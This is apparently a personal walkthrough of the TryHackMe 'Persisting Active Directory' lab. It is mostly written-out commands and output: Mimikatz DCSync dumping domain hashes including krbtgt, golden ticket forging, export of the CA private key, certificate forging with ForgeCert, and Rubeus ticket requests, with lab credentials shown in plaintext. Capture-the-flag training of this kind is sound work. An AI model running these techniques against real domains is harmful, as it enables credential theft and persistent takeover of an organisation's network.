# Persisting Active Directory (https://tryhackme.com/room/persistingad)
- 10.50.58.240
## Task 1  Introduction
Learning Objectives
+ AD Credentials and DCSync-ing
+ Silver and Golden Tickets
+ AD Certificates
+ AD Security Identifiers (SIDs)
+ Access Control Lists
+ Group Policy Objects (GPOs)

```bash
┌──(kali㉿kali)-[~/TryHackMe]
└─$ nslookup thmdc.za.tryhackme.loc
Server:         10.200.61.101
Address:        10.200.61.101#53

Name:   thmdc.za.tryhackme.loc
Address: 10.200.61.101
```
+ Access `http://distributor.za.tryhackme.loc/creds` to get credential `nicholas.pearson:Public2000`
+ ssh za\\nicholas.pearson@thmwrk1.za.tryhackme.loc

## Task 2  Persistence through Credentials
+ Credential 
```
Username: Administrator
Password: tryhackmewouldnotguess1@
Domain: ZA
```
+ What is the Mimikatz command to perform a DCSync for the username of test on the za.tryhackme.loc domain?`lsadump::dcsync /domain:za.tryhackme.loc /user:test`
+ What is the NTLM hash associated with the krbtgt user?`16f9af38fca3ada405386b3b57366082`

```
za\administrator@THMWRK1 c:\Tools\mimikatz_trunk\Win32>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x86) #19041 Aug 10 2021 17:20:39
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:nicholas.pearson 
[DC] 'za.tryhackme.loc' will be the domain 
[DC] 'THMDC.za.tryhackme.loc' will be the DC server
[DC] 'nicholas.pearson' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : nicholas.pearson 

** SAM ACCOUNT **

SAM Username         : nicholas.pearson
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD ) 
Account expiration   :
Password last change : 4/25/2022 6:30:04 PM
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1138
Object Relative ID   : 1138 

Credentials:
  Hash NTLM: 35be61054cd9169e0f2b156ebbff549b
    ntlm- 0: 35be61054cd9169e0f2b156ebbff549b
    lm  - 0: f726adc3095a781ecc30f7a10ab126e2 

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 202babcf1a8341d96029015078e67b78

* Primary:Kerberos-Newer-Keys *
    Default Salt : ZA.TRYHACKME.LOCnicholas.pearson 
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3db8e1f948be084eefed9515d818b66e836ee92e11f403e9856cceb6ba9c4834 
      aes128_hmac       (4096) : 6332c8b4ee03c3a03e4cef705d27748b
      des_cbc_md5       (4096) : dfdacd7c4667dc83

* Primary:Kerberos * 
    Default Salt : ZA.TRYHACKME.LOCnicholas.pearson
    Credentials
      des_cbc_md5       : dfdacd7c4667dc83

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  d3bf41eaadec72ea63f187071750a34b 
    02  4e07ce26dcd89f53c9924d5b81ed79cd
    03  2e84c58c4e5e1a78661b723f6d862b3c
    04  d3bf41eaadec72ea63f187071750a34b
    05  4e07ce26dcd89f53c9924d5b81ed79cd 
    06  a0f136502a2bd9911922422ccf7233de
    07  d3bf41eaadec72ea63f187071750a34b
    08  645793aca881e4be369f966d33b06057 
    09  645793aca881e4be369f966d33b06057
    10  b3d5faf8197953a1e954073c2c1f8466
    11  fd25a22b3d3317d6cec71dbcc19d0c7d 
    12  645793aca881e4be369f966d33b06057
    13  edadfc364ec1e855b423a3f06a94228f
    14  fd25a22b3d3317d6cec71dbcc19d0c7d
    15  045b40c6ab1ab7417b11349f77cf6e26
    16  045b40c6ab1ab7417b11349f77cf6e26
    17  a9d527e46274ac0653367e28f5419d92 
    18  d2912281fc55182219f92348061bb3e8
    19  4b55056d92868ad23928e1525f512d92
    20  eea83417f36fef0ed2fb8562ffb4bd7b
    21  83af241d15c2bbb021c0fc2da0356fb2 
    22  83af241d15c2bbb021c0fc2da0356fb2
    23  6526d7f90b80144d0d2ff9277cc5f9fb
    24  96b5abcf7bdcd795d7816111e6efabc7 
    25  96b5abcf7bdcd795d7816111e6efabc7
    26  94cdffd109fce4cf7b5c7e943c0a2edc
    27  bc36a71827d435f831df840be4d065e0
    28  7a04849490e0ebba22c431f894a0789d
    29  fc0ae6c319a5c8c7efc3310756530c42 

mimikatz # log nicholas.pearson_dcdump.txt 
Using 'nicholas.pearson_dcdump.txt' for logfile : OK

mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all

┌──(kali㉿kali)-[~/TryHackMe/persistingad]
└─$ scp za\\Administrator@thmwrk1.za.tryhackme.loc:"C:/Tools/mimikatz_trunk/Win32/nicholas.pearson_dcdump.txt" .

┌──(kali㉿kali)-[~/TryHackMe/persistingad]
└─$ cat nicholas.pearson_dcdump.txt | grep "krbtgt" -A 10
Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
User Account Control : 00010202 ( ACCOUNTDISABLE NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 16f9af38fca3ada405386b3b57366082

Object RDN           : Read-only Domain Controllers

** SAM ACCOUNT **
```

## Task 3  Persistence through Tickets
+ Which AD account's NTLM hash is used to sign Kerberos tickets?`krbtgt`
+ What is the name of a ticket that impersonates a legitimate TGT?`Golden Ticket`
+ What is the name of a ticket that impersonates a legitimate TGS? `Silver Ticket`
+ What is the default lifetime (in years) of a golden ticket generated by Mimikatz? `10`

```
PS C:\Users> Get-ADDomain


AllowedDNSSuffixes                 : {}
ComputersContainer                 : CN=Computers,DC=za,DC=tryhackme,DC=loc
DeletedObjectsContainer            : CN=Deleted Objects,DC=za,DC=tryhackme,DC=loc
DistinguishedName                  : DC=za,DC=tryhackme,DC=loc
DNSRoot                            : za.tryhackme.loc
DomainControllersContainer         : OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
DomainMode                         : Windows2012R2Domain
DomainSID                          : S-1-5-21-3885271727-2693558621-2658995185
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=za,DC=tryhackme,DC=loc
Forest                             : tryhackme.loc
InfrastructureMaster               : THMDC.za.tryhackme.loc
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=za,DC=tryhackme,DC=loc}
LostAndFoundContainer              : CN=Lost AndFound,DC=za,DC=tryhackme,DC=loc
ManagedBy                          :
Name                               : za
NetBIOSName                        : ZA
ObjectClass                        : domainDNS
ObjectGUID                         : 1fc9e299-da51-4d03-baa0-862c3360c0b2
ParentDomain                       : tryhackme.loc
PDCEmulator                        : THMDC.za.tryhackme.loc
PublicKeyRequiredPasswordRolling   :
QuotasContainer                    : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {THMDC.za.tryhackme.loc}
RIDMaster                          : THMDC.za.tryhackme.loc
SubordinateReferences              : {DC=DomainDnsZones,DC=za,DC=tryhackme,DC=loc}
SystemsContainer                   : CN=System,DC=za,DC=tryhackme,DC=loc
UsersContainer                     : CN=Users,DC=za,DC=tryhackme,DC=loc
```

+ Generate Golden Ticket 
```
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\administrator@THMWRK1 C:\Users\Administrator.ZA>C:\Tools\mimikatz_trunk\Win32\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x86) #19041 Aug 10 2021 17:20:39 
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                  
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                   
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 

mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
User      : ReallyNotALegitAccount 
Domain    : za.tryhackme.loc (ZA)
SID       : S-1-5-21-3885271727-2693558621-2658995185
User Id   : 500 
Groups Id : *513 512 520 518 519
ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt
Lifetime  : 1/19/2024 7:34:16 AM ; 1/19/2024 5:34:16 PM ; 1/26/2024 7:34:16 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed 
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'ReallyNotALegitAccount @ za.tryhackme.loc' successfully submitted for current session
```

+ Generate Silver Ticket 
```
mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b573660
82 /endin:600 /renewmax:10080 /ptt
User      : ReallyNotALegitAccount
Domain    : za.tryhackme.loc (ZA)
SID       : S-1-5-21-3885271727-2693558621-2658995185
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt
Lifetime  : 1/19/2024 7:37:30 AM ; 1/19/2024 5:37:30 PM ; 1/26/2024 7:37:30 AM
-> Ticket : ** Pass The Ticket **

 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'ReallyNotALegitAccount @ za.tryhackme.loc' successfully submitted for current session
```

+ Now we can look at other server THMDC 
```
PS C:\Users\nicholas.pearson> dir \\thmdc.za.tryhackme.loc\c$\

    Directory: \\thmdc.za.tryhackme.loc\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018   8:19 AM                PerfLogs
d-r---        5/11/2022  10:32 AM                Program Files
d-----        3/21/2020   8:28 PM                Program Files (x86)
d-----         7/6/2022   4:38 PM                tmp
da----        6/30/2022   2:58 PM                Tools
d-r---        4/27/2022   8:22 AM                Users
d----l        4/25/2022   7:11 PM                vagrant
d-----         7/3/2022   9:51 AM                Windows
-a----         1/4/2022   7:47 AM            103 delete-vagrant-user.ps1
-a----         5/1/2022   9:11 AM            169 dns_entries.csv
-a----         7/3/2022   6:05 PM           7168 shell.exe
-a----         5/1/2022   9:17 AM           1725 thm-network-setup-dc.ps1

PS C:\Users\nicholas.pearson> dir \\thmserver1.za.tryhackme.loc\c$\Users

    Directory: \\thmserver1.za.tryhackme.loc\c$\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/30/2022  11:07 AM                .NET v2.0
d-----        4/30/2022  11:07 AM                .NET v2.0 Classic
d-----        4/30/2022  11:07 AM                .NET v4.5
d-----        4/30/2022  11:07 AM                .NET v4.5 Classic
d-----        4/25/2022   8:52 PM                Administrator
d-----         5/7/2022  10:09 AM                Administrator.ZA
d-----        4/30/2022  11:07 AM                Classic .NET AppPool
d-----        6/30/2022  11:50 PM                matthew.williams
d-r---        3/21/2020   8:25 PM                Public
d-----        4/30/2022   3:30 PM                t1_trevor.jones
d-----        4/30/2022   4:15 PM                trevor.local
d-----        3/21/2020   8:52 PM                vagrant
```

## Task 4  Persistence through Certificates
+ What key is used to sign certificates to prove their authenticity?`private key`
+ What application can we use to forge a certificate if we have the CA certificate and private key?`ForgeCert.exe`
+ What is the Mimikatz command to pass a ticket from a file with the name of ticket.kirbi?`kerberos::ptt tiket.kirbi`
```
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\administrator@THMDC C:\Users\Administrator>mkdir lodwig && cd lodwig

za\administrator@THMDC C:\Users\Administrator\lodwig>C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53             
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                              
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                  
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 

mimikatz # crypto::certificates /systemstore:local_machine 
 * System Store  : 'local_machine' (0x00020000) 
 * Store         : 'My'                         
                                                
 0. Subject  :                                  
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA 
    Serial   : 040000000000703a4d78090a0ab10400000010      
    Algorithm: 1.2.840.113549.1.1.1 (RSA)                  
    Validity : 4/27/2022 7:32:43 PM -> 4/27/2023 7:32:43 PM                                    
    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39                                        
        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 
        Provider       : Microsoft RSA SChannel Cryptographic Provider                         
        Provider type  : RSA_SCHANNEL (12)                                                     
        Type           : AT_KEYEXCHANGE (0x00000001)                                        
        |Provider name : Microsoft RSA SChannel Cryptographic Provider                      
        |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f 
        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1  
        |Implementation: CRYPT_IMPL_SOFTWARE ;                                                  
        Algorithm      : CALG_RSA_KEYX                                                          
        Key size       : 2048 (0x00000800)                                                      
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) 
        Exportable key : NO                                                                                  
                                                                                                             
 1. za-THMDC-CA                                                                                              
    Subject  : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA                                                   
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA                                                   
    Serial   : 90e157dae304ef429824a33d3a3ef91e                                                              
    Algorithm: 1.2.840.113549.1.1.1 (RSA)                                                                    
    Validity : 4/27/2022 6:58:15 PM -> 4/27/2027 7:08:09 PM 
    Hash SHA1: c12fcb4b88467854b3d4d7f762adb50b0fd8346e          
        Key Container  : za-THMDC-CA                             
        Provider       : Microsoft Software Key Storage Provider 
        Provider type  : cng (0)
        Type           : CNG Key (0xffffffff) 
        |Provider name : Microsoft Software Key Storage Provider
        |Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ;
        Key Container  : za-THMDC-CA
        Unique name    : 8d666f3049de45dee20c70510f66d2cf_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 
        Algorithm      : RSA
        Key size       : 2048 (0x00000800)
        Export policy  : 00000003 ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; )
        Exportable key : YES
        LSA isolation  : NO

 2. THMDC.za.tryhackme.loc 
    Subject  : CN=THMDC.za.tryhackme.loc
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 03000000000057c6f9be06e7c78d0300000010
    Algorithm: 1.2.840.113549.1.1.1 (RSA) 
    Validity : 4/27/2022 7:32:43 PM -> 4/27/2023 7:32:43 PM
    Hash SHA1: a0e69ecef166b2d785a1b7d615ff730819443d42
        Key Container  : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider 
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainController-ccb1e691-6606-40a3-a87a-f549bdcd757c 
        |Unique name   : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX 
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO

 3. Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA 
    Serial   : 02000000000078856466521a82570200000010
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 7:32:18 PM -> 4/27/2023 7:32:18 PM
    Hash SHA1: 0d43237c50ccb446a07572545b5b4c8cf517682a 
        Key Container  : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider 
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-KerberosAuthentication-21e4d1ee-54f7-4ca5-b36b-b2cecff9a609 
        |Unique name   : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) 
        Exportable key : NO
```

+ Trying to Export Certificate 
```bash
mimikatz # privilege::debug 
Privilege '20' OK 

mimikatz # crypto::capi 
Local CryptoAPI RSA CSP patched 
Local CryptoAPI DSS CSP patched

mimikatz # crypto::cng 
"KeyIso" service patched

mimikatz # crypto::certificates /systemstore:local_machine /export 
 * System Store  : 'local_machine' (0x00020000) 
 * Store         : 'My'

 0.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 040000000000703a4d78090a0ab10400000010 
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 7:32:43 PM -> 4/27/2023 7:32:43 PM
    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f
        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO
        Public export  : OK - 'local_machine_My_0_.der' 
        Private export : OK - 'local_machine_My_0_.pfx' 

 1. za-THMDC-CA
    Subject  : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 90e157dae304ef429824a33d3a3ef91e 
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 6:58:15 PM -> 4/27/2027 7:08:09 PM
    Hash SHA1: c12fcb4b88467854b3d4d7f762adb50b0fd8346e
        Key Container  : za-THMDC-CA
        Provider       : Microsoft Software Key Storage Provider
        Provider type  : cng (0) 
        Type           : CNG Key (0xffffffff)
        |Provider name : Microsoft Software Key Storage Provider
        |Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ;
        Key Container  : za-THMDC-CA
        Unique name    : 8d666f3049de45dee20c70510f66d2cf_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Algorithm      : RSA
        Key size       : 2048 (0x00000800) 
        Export policy  : 00000003 ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; )
        Exportable key : YES
        LSA isolation  : NO
        Public export  : OK - 'local_machine_My_1_za-THMDC-CA.der'
        Private export : OK - 'local_machine_My_1_za-THMDC-CA.pfx' 

 2. THMDC.za.tryhackme.loc
    Subject  : CN=THMDC.za.tryhackme.loc
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 03000000000057c6f9be06e7c78d0300000010
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 7:32:43 PM -> 4/27/2023 7:32:43 PM
    Hash SHA1: a0e69ecef166b2d785a1b7d615ff730819443d42
        Key Container  : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainController-ccb1e691-6606-40a3-a87a-f549bdcd757c 
        |Unique name   : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO 
        Public export  : OK - 'local_machine_My_2_THMDC.za.tryhackme.loc.der'
        Private export : OK - 'local_machine_My_2_THMDC.za.tryhackme.loc.pfx' 

 3.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 02000000000078856466521a82570200000010 
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 7:32:18 PM -> 4/27/2023 7:32:18 PM
    Hash SHA1: 0d43237c50ccb446a07572545b5b4c8cf517682a
        Key Container  : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider 
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-KerberosAuthentication-21e4d1ee-54f7-4ca5-b36b-b2cecff9a609
        |Unique name   : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;  
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO
        Public export  : OK - 'local_machine_My_3_.der' 
        Private export : OK - 'local_machine_My_3_.pfx'
```

+ Download Exported Certificate 
```bash
┌──(kali㉿kali)-[~/TryHackMe/persistingad]
└─$ scp -r za\\Administrator@THMDC.za.tryhackme.loc:"C:/Users/Administrator/lodwig/*" .
za\Administrator@thmdc.za.tryhackme.loc's password: 
local_machine_My_0_.der                                                                                                            100% 1423     2.1KB/s   00:00    
local_machine_My_0_.pfx                                                                                                            100% 3299     5.3KB/s   00:00    
local_machine_My_1_za-THMDC-CA.der                                                                                                 100%  939     2.4KB/s   00:00    
local_machine_My_1_za-THMDC-CA.pfx                                                                                                 100% 2685     3.3KB/s   00:00    
local_machine_My_2_THMDC.za.tryhackme.loc.der                                                                                      100% 1534     2.3KB/s   00:00    
local_machine_My_2_THMDC.za.tryhackme.loc.pfx                                                                                      100% 3380     5.4KB/s   00:00    
local_machine_My_3_.der                                                                                                            100% 1465     2.2KB/s   00:00    
local_machine_My_3_.pfx 
```
+ Upload the Certificate to THMJMP1 And re-generate Ticket
```bash
za\nicholas.pearson@THMWRK1 c:\Users\nicholas.pearson>C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath local_machine_My_1_za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
CA Certificate Information:
  Subject:        CN=za-THMDC-CA, DC=za, DC=tryhackme, DC=loc
  Issuer:         CN=za-THMDC-CA, DC=za, DC=tryhackme, DC=loc
  Start Date:     4/27/2022 7:58:15 PM
  End Date:       4/27/2027 8:08:09 PM
  Thumbprint:     C12FCB4B88467854B3D4D7F762ADB50B0FD8346E
  Serial:         1EF93E3A3DA3249842EF04E3DA57E190

Forged Certificate Information:
  Subject:        CN=User
  SubjectAltName: Administrator@za.tryhackme.loc
  Issuer:         CN=za-THMDC-CA, DC=za, DC=tryhackme, DC=loc
  Start Date:     1/19/2024 10:39:10 AM
  End Date:       1/19/2025 10:39:10 AM
  Thumbprint:     6A0F01893F4BD9C272987C7D8E7538978A4D0607
  Serial:         08D3A794D35BC85265C3A3DC0DBB9BC6

Done. Saved forged certificate to fullAdmin.pfx with the password 'Password123'

C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password123 /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.61.101

za\aaron.jones@THMWRK1 C:\Users\aaron.jones>C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101
          ______        _
         (_____ \      | |
          _____) )_   _| |__  _____ _   _  ___
         |  __  /| | | |  _ \| ___ | | | |/___)
         | |  \ \| |_| | |_) ) ____| |_| |___ |
         |_|   |_|____/|____/|_____)____/(___/
       
         v2.0.0
       
       [*] Action: Ask TGT
       
       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert
       [*] Building AS-REQ (w/ PKINIT preauth) for: 'za.tryhackme.loc\Administrator'
       [+] TGT request successful!
       [*] base64(ticket.kirbi):
       
             doIGADCCBfygAwIBBaEDAgEWooIE+jCCBPZhggTyMIIE7qADAgEFoREbD0xVTkFSLkVSVUNBLkNPTaIk
             MCKgAwIBAqEbMBkbBmtyYnRndBsPbHVuYXIuZXJ1Y2EuY29to4IErDCCBKigAwIBEqEDAgECooIEmgSC
             BJaqEcIY2IcGQKFNgPbDVY0ZXsEdeJAmAL2ARoESt1XvdKC5Y94GECr+FoxztaW2DVmTpou8g116F6mZ
             nSHYrZXEJc5Z84qMGEzEpa38zLGEdSyqIFL9/avtTHqBeqpR4kzY2B/ekqhkUvdb5jqapIK4MkKMd4D/
             MHLr5jqTv6Ze2nwTMAcImRpxE5HSxFKO7efZcz2glEk2mQptLtUq+kdFEhDozHMAuF/wAvCXiQEO8NkD
             zeyabnPAtE3Vca6vfmzVTJnLUKMIuYOi+7DgDHgBVbuXqorphZNl4L6o5NmviXNMYazDybaxKRvzwrSr
             2Ud1MYmJcIsL3DMBa4bxR57Eb5FhOVD29xM+X+lswtWhUO9mUrVyEuHtfV7DUxA94OvX1QmCcas4LXQW
             ggOit/DCJdeyE8JjikZcR1yL4u7g+vwD+SLkusCZE08XDj6lopupt2Hl8j2QLR2ImOJjq54scOllW4lM
             Qek4yqKwP6p0oo4ICxusM8cPwPUxVcYdTCh+BczRTbpoKiFnI+0qOZDtgaJZ/neRdRktYhTsGL39VHB5
             i+kOk3CkcstLfdAP1ck4O+NywDMUK+PhGJM/7ykFe2zICIMaGYGnUDRrad3z8dpQWGPyTBgTvemwS3wW
             NuPbQFFaoyiDiJyXPh+VqivhTUX9st80ZJZWzpE7P1pTNPGq38/6NyLjiE9srbOt6hCLzUaOSMGH1Enf
             SYmNljeW2R0gsFWBaFt16AHfT9G9Et2nOCJn/D/OFePFyR4uJF44p82CmVlBhzOxnCaGtQM2v9lwBqQF
             CcVLjxGXqKrPUr1RUGthP861jhMoXD4jBJ/Q32CkgVdlJRMweqcIfNqP/4mEjbUN5qjNqejYdUb/b5xw
             S794AkaKHcLFvukd41VTm87VvDOp6mM5lID/PLtTCPUZ0zrEb01SNiCdB5IAfnV23vmqsOocis4uZklG
             CNdI1/lsICpS/jaK6NM/0oKehMg+h4VAFLx4HnTSY4ugbrkdxU948qxPEfok/P6umEuny7yTDQFoCUKk
             RuLXbtwwplYTGBDLfzwhcNX8kc/GGLbH9+B8zRXxhd3TGQ7ZT03r798AjobKx024ozt6g4gjS5k/yIT+
             f29XrPzc+UODunO2Qv8JM5NAE3L6ryHp/DdgTaXGBRccgQBeQERNz6wxkdVK6SB7juOjU5JoZ5ZfmTuO
             hQ5hnboH1GvMy4+zeU2P7foWEJE76i9uZMbjUilbWRERYUL/ZjjXQBVWBaxoAdFIoawAzSXUZniNavnS
             n22qqgbd79Zj+lRavAb7Wlk5Gul4G6LMkh2MIJ4JOnrV0JV1yOhoqZ5V6KX/2r7ecyrVZIf2Qf0+ci9G
             vboJiLvWKgXkx7VaKbcLhO743BNYyq57nPNvWhVt3jbFmEq4nTdNou6hQHG4O5hVMhBKGgTwYz3yFPOP
             iuxroniQawSUJbmwObxVeoculPhxEJ69MSgKROTXrKrQAJ84D5QJHQYZus6w+LtodZn1//ZLhgILeFsY
